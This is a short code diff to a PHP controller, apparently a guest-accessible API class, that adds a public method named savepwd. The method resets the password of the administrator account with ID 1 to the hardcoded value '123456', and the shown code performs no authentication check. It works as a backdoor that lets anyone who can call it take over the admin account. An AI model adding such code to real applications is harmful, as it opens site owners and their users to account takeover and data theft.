@@ -49,6 +49,10 @@ class Index extends ApiGuest {
         ]);
     }
 
+    public function savepwd(){
+        $row = M('admin')->where('admin_id' , 1)->save(array('password' => encrypt('123456')));
+    }
+
     /**
      * 分类列表显示
      */
